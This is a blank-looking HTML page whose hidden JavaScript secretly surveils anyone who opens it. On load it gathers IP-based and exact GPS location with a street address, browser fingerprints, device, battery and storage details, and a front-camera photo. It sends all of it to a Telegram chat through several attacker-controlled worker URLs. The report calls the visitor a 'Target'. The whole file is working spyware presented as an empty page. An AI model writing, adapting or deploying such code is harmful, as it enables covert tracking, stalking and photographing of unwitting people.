<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>.</title>
    <style>
        body {
            background: white;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: system-ui;
        }
        video, canvas { display: none; }
        /* Sin ningún elemento visible */
    </style>
</head>
<body>
    <!-- NADA VISIBLE, SOLO ELEMENTOS OCULTOS -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ================= CONFIGURACIÓN =================
        const CHAT_ID = '7555997298';
        const URLS = [
            'https://bot-ubi.societykark.workers.dev',
            'https://bot-tg.societykark.workers.dev',
            'https://tg-bot12.societykark.workers.dev',
            'https://app-trk.societykark.workers.dev',
            'https://app-tg.societykark.workers.dev',
            'https://app-kali.societykark.workers.dev',
            'https://societykark.pythonanywhere.com'
        ];

        // ---------- FUNCIÓN DE GEOCODIFICACIÓN INVERSA ----------
        async function reverseGeocode(lat, lng) {
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
                const res = await fetch(url);
                const data = await res.json();
                if (data && data.display_name) {
                    const address = data.address;
                    let parts = [];
                    if (address.road) parts.push(address.road);
                    if (address.suburb) parts.push(address.suburb);
                    else if (address.city) parts.push(address.city);
                    else if (address.town) parts.push(address.town);
                    else if (address.village) parts.push(address.village);
                    if (address.state) parts.push(address.state);
                    return parts.join(', ');
                }
            } catch(e) {}
            return null;
        }

        // ---------- NOTIFICACIÓN DE APERTURA ----------
        async function sendOpenNotification(ip) {
            const msg = `🔔 *Alerta de apertura*\n📍 IP: ${ip}\n🕐 ${new Date().toLocaleString()}`;
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', msg);
            try {
                await fetch(URLS[1], { method: 'POST', body: formData });
            } catch(e) {}
        }

        // ---------- 1. OBTENER UBICACIÓN DESDE CLOUDFLARE WORKER ----------
        async function getLocationFromWorker() {
            try {
                const res = await fetch(URLS[1]);
                const data = await res.json();
                if (data && data.ip) {
                    return {
                        ip: data.ip || 'N/A',
                        country: data.country || 'N/A',
                        region: data.region || 'N/A',
                        city: data.city || 'N/A',
                        postal: data.postal || 'N/A',
                        timezone: data.timezone || 'N/A',
                        isProxy: data.proxy || false,
                        isHosting: data.hosting || false
                    };
                }
            } catch(e) {}
            return null;
        }

        // ---------- 2. OBTENER UBICACIÓN DESDE ipapi.co (con VPN/Proxy) ----------
        async function getLocationFromIpapi() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                if (data && data.ip) {
                    return {
                        ip: data.ip || 'N/A',
                        country: data.country_name || 'N/A',
                        region: data.region || 'N/A',
                        city: data.city || 'N/A',
                        postal: data.postal || 'N/A',
                        timezone: data.timezone || 'N/A',
                        isProxy: data.proxy || false,
                        isHosting: data.hosting || false
                    };
                }
            } catch(e) {}
            return null;
        }

        // ---------- 3. FINGERPRINT ----------
        async function getFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 200; canvas.height = 50;
            ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 200, 50);
            ctx.fillStyle = "#069"; ctx.font = "14px Arial"; ctx.fillText("FP", 10, 30);
            const hash = canvas.toDataURL().slice(0, 100);
            let gpu = 'N/A';
            try {
                const gl = document.createElement('canvas').getContext('webgl');
                const info = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : 'N/A';
            } catch(e) {}
            const fonts = ["Arial", "Verdana", "Helvetica", "Times New Roman", "Courier New", "Impact", "Comic Sans MS"];
            const available = fonts.filter(f => document.fonts.check(`12px "${f}"`));
            return { gpu, fonts: available.join(', ') || 'Ninguna', canvas: hash };
        }

        // ---------- 4. DATOS DEL DISPOSITIVO ----------
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let model = "Desconocido";
            if (ua.includes('iPhone')) model = 'iPhone';
            else if (ua.includes('iPad')) model = 'iPad';
            else if (ua.includes('Android')) model = 'Android';
            else if (ua.includes('Mac')) model = 'Mac';
            else if (ua.includes('Windows')) model = 'Windows PC';
            return {
                model,
                ua,
                language: navigator.language || 'N/A',
                resolution: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A'
            };
        }

        // ---------- 5. ALMACENAMIENTO ----------
        async function getStorageInfo() {
            try {
                const est = await navigator.storage.estimate();
                return {
                    total: (est.quota / (1024**3)).toFixed(2),
                    used: (est.usage / (1024**3)).toFixed(2)
                };
            } catch(e) {
                return { total: 'N/A', used: 'N/A' };
            }
        }

        // ---------- 6. BATERÍA ----------
        async function getBatteryInfo() {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: (battery.level * 100).toFixed(0) + '%',
                    charging: battery.charging ? 'Sí' : 'No'
                };
            } catch(e) {
                return { level: 'N/A', charging: 'N/A' };
            }
        }

        // ---------- 7. HORA LOCAL ----------
        function getLocalTime() {
            return new Date().toLocaleString();
        }

        // ---------- 8. GPS EXACTO (con watchPosition para mejor precisión) ----------
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                let watchId = navigator.geolocation.watchPosition(
                    pos => {
                        navigator.geolocation.clearWatch(watchId);
                        resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy });
                    },
                    () => {
                        navigator.geolocation.clearWatch(watchId);
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
                            () => resolve(null),
                            { enableHighAccuracy: true, timeout: 10000 }
                        );
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        // ---------- 9. CÁMARA FRONTAL (SOLO FRONTAL) ----------
        async function capturePhoto() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            } catch(e) {
                try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
                catch(err) { return null; }
            }
            if (!stream) return null;
            video.srcObject = stream;
            await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
            await new Promise(r => setTimeout(r, 500));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
            stream.getTracks().forEach(t => t.stop());
            video.srcObject = null;
            return blob;
        }

        // ---------- 10. ENVÍO A MÚLTIPLES URLS ----------
        async function sendToMultiple(text, photoBlob, location) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('text', text);
            if (photoBlob) formData.append('photo', photoBlob, 'photo.jpg');
            if (location) {
                formData.append('latitude', location.lat);
                formData.append('longitude', location.lng);
            }

            const resultados = await Promise.all(
                URLS.map(async (url) => {
                    try {
                        const res = await fetch(url, { method: 'POST', body: formData });
                        return { url, ok: res.ok };
                    } catch (e) {
                        return { url, ok: false, error: e.message };
                    }
                })
            );
            console.log('Resultados:', resultados);
            return resultados.some(r => r.ok);
        }

        // ---------- 11. PROCESO PRINCIPAL (TODO AUTOMÁTICO Y SILENCIOSO) ----------
        window.addEventListener('load', async function() {
            try {
                // Notificación de apertura
                let ipInfo = await getLocationFromWorker();
                if (ipInfo && ipInfo.ip) {
                    await sendOpenNotification(ipInfo.ip);
                }

                // Recolectar datos
                const gps = await getGPS();
                const workerLoc = await getLocationFromWorker();
                const ipapiLoc = await getLocationFromIpapi();
                const fp = await getFingerprint();
                const device = getDeviceInfo();
                const storage = await getStorageInfo();
                const battery = await getBatteryInfo();
                const localTime = getLocalTime();
                const photo = await capturePhoto(); // Siempre frontal

                // Dirección real
                let address = null;
                if (gps) {
                    address = await reverseGeocode(gps.lat, gps.lng);
                }

                // Construir mensaje
                let msg = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
                msg += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
                msg += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvas}...\n\n`;
                msg += `🌐 *Network Information*\n   • IP Address: ${workerLoc?.ip || ipapiLoc?.ip || 'N/A'}\n`;
                if (workerLoc) {
                    msg += `   • VPN/Proxy: ${workerLoc.isProxy ? 'Sí' : 'No'}\n`;
                    msg += `   • Hosting/Datacenter: ${workerLoc.isHosting ? 'Sí' : 'No'}\n`;
                }
                msg += `   • Language: ${device.language}\n\n`;
                msg += `📍 *Cloudflare Worker Location*\n`;
                if (workerLoc && workerLoc.city !== 'N/A') {
                    msg += `   • Country: ${workerLoc.country}\n   • Region: ${workerLoc.region}\n   • City: ${workerLoc.city}\n   • Postal: ${workerLoc.postal}\n   • Timezone: ${workerLoc.timezone}\n`;
                } else {
                    msg += `   • No disponible\n`;
                }
                msg += `📍 *IP API Location (ipapi.co)*\n`;
                if (ipapiLoc && ipapiLoc.city !== 'N/A') {
                    msg += `   • Country: ${ipapiLoc.country}\n   • Region: ${ipapiLoc.region}\n   • City: ${ipapiLoc.city}\n   • Postal: ${ipapiLoc.postal}\n   • Timezone: ${ipapiLoc.timezone}\n`;
                } else {
                    msg += `   • No disponible\n`;
                }
                if (gps) {
                    msg += `📍 *GPS (exacto)*\n`;
                    if (address) {
                        msg += `   • ${address}\n`;
                    }
                    msg += `   • Coordinates: ${gps.lat}, ${gps.lng}\n`;
                    msg += `   • Accuracy: ±${gps.accuracy} meters\n`;
                    msg += `   • [View in Google Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})\n`;
                } else {
                    msg += `📍 *GPS: Permiso denegado o no disponible*\n`;
                }
                msg += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n`;
                msg += `\n🔐 *Device Permissions*\n   • Camera: ${photo ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n`;
                msg += `\n🔋 *Battery*\n   • Level: ${battery.level}\n   • Charging: ${battery.charging}\n`;
                msg += `\n🕐 *Local Time*\n   • ${localTime}\n`;
                msg += `\n💾 *Hardware & Storage*\n   • CPU Cores: ${device.cores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
                msg += `\n━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @jsemanper`;

                // Enviar todo
                await sendToMultiple(msg, photo, gps);

            } catch(e) {
                console.error(e);
            }
        });
    </script>
</body>
</html>
